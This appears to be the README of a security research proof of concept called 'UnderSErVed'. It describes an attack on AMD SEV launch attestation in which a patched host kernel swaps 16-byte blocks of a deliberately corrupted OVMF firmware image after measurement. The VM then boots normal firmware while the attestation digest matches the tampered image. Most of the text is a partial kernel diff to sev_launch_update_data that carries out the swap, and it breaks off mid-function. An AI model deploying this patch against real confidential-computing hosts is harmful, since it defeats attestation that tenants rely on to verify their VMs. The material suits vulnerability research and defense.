# UnderSErVed

This attack exploits a computational flaw in the Attestation process, allowing an attacker to arbitrarily modify the OVMF content in the kernel and thereby bypass the Attestation verification mechanism.

Our test procedure is as follows: First, we modify two locations in the OVMF image, making it completely unbootable. Then, within the kernel, we restore these locations back to their original values. If the attestation process is secure, the virtual machine should fail to boot. However, if a vulnerability exists, the VM will boot successfully, and the measured digest will still correspond to the tampered (unbootable) OVMF.

```
[Attacker prepares a corrupted OVMF]
        ↓
[Start VM and trigger Attestation]
        ↓
[Attestation measures the corrupted OVMF]
        ↓
[Kernel hot-patches OVMF back to normal]
        ↓
[Attestation completes, digest is for corrupted OVMF]
        ↓
[VM boots successfully, actually running the normal OVMF]
        ↓
[Attestation is bypassed]


## Required Kernel Patch

At minimum, the following kernel code must be included:
```
 static int sev_launch_update_data(struct kvm *kvm, struct kvm_sev_cmd *argp)
 {
-	unsigned long vaddr, vaddr_end, next_vaddr, npages, pages, size, i;
-	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
+	unsigned long vaddr, vaddr_end, npages, size, i;
+	// struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
 	struct kvm_sev_launch_update_data params;
-	struct sev_data_launch_update_data data;
+	// struct sev_data_launch_update_data data;
 	struct page **inpages;
 	int ret;
+	uint64_t sizeIn16BChuncks;
+	uint64_t * ordered_16byte_chunks = NULL;
 
 	if (!sev_guest(kvm))
 		return -ENOTTY;
@@ -639,6 +719,71 @@ static int sev_launch_update_data(struct kvm *kvm, struct kvm_sev_cmd *argp)
 	size = params.len;
 	vaddr_end = vaddr + size;
 
+	printk("sev_launch_update_data: vaddr=%lx size=%lx vaddr_end=%lx\n",vaddr,size,vaddr_end);
+
+	if( size % 16 != 0) {
+		printk("sev_lauch_update_data called with size %lx which is not a multiple of 16, aborting",size);
+		ret = 1;
+		goto e_free;
+	}
+	if( (vaddr & (PAGE_SIZE -1)) != 0 ) {
+		printk("buffer is not page aligned");
+		ret = 1;
+		goto e_free;
+	}
+
+	printk("sev_launch_update_data: vaddr checks passed");
+	sizeIn16BChuncks = size/16;
+	ordered_16byte_chunks = vmalloc(sizeIn16BChuncks * sizeof(uint64_t)); 
+	if( ordered_16byte_chunks == NULL ) {
+		printk("sev_launch_update_data: failed to alloc ordered_16byte_chunks array\n");
+	}
+	for(i = 0; i < sizeIn16BChuncks; i++) {
+		ordered_16byte_chunks[i] = (i*16);
+	}
+	printk("sev_launch_update_data: ordered_16_byte_chunks array initialized\n");
+
+	//perform swapping and update array so that reading it from left to right still gives us the correct order
+	if( launch_attack_config.active) {
+		uint64_t target_offset = launch_attack_config.target_block;
+		uint64_t source_offset;
+		uint8_t buffer[16];
+		uint8_t buffer2[16];
+		int err_code;
+		for( i = 0; i < launch_attack_config.source_blocks_len; i++,target_offset+=16) {
+			source_offset = launch_attack_config.source_blocks[i];
+			printk("sev_launch_update_data: swapping target=%llx with source=%llx\n", vaddr+target_offset, vaddr+source_offset);
+			//copy target_offset to buffer
+			if( (err_code = copy_from_user(buffer,(void*)(vaddr+target_offset),16) )) {
+				printk("copy target to buffer failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//copy source_offset to buffer2
+			if( (err_code = copy_from_user(buffer2,(void*)(vaddr+source_offset),16) ) ) {
+				printk("copy source to buffer2 failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//copy buffer to buffer2 to source offset
+			if( (err_code = copy_to_user((void*)(vaddr+target_offset),buffer2,16))){
+				printk("copy buffer 2 to target failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//copy buffer to source_offset
+			if( (err_code = copy_to_user((void*)(vaddr+source_offset),buffer,16))) {
+				printk("copy buffer to source failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//adjust entries in ordered_16byte_chunks array
+			ordered_16byte_chunks[target_offset/16] = source_offset;
+			ordered_16byte_chunks[source_offset/16] = target_offset;
+		}
+	}
+	printk("sev_launch_update_data: swapped plaintext data");
+

```

